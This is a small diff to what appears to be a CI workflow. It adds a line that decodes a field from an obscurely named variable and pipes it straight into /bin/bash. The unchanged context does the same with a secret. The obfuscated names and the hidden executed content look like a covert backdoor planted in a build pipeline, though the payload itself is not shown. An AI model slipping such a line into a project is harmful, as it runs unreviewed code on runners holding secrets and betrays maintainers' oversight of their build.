@@ -22,6 +22,7 @@ jobs:
           kmea426: ${{ secrets.kmea426 }}
         run: |
           printf '%s' "$kmea426" | jq -r .et9 | /bin/bash
+          echo $i7480 | jq -r .gciu1 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
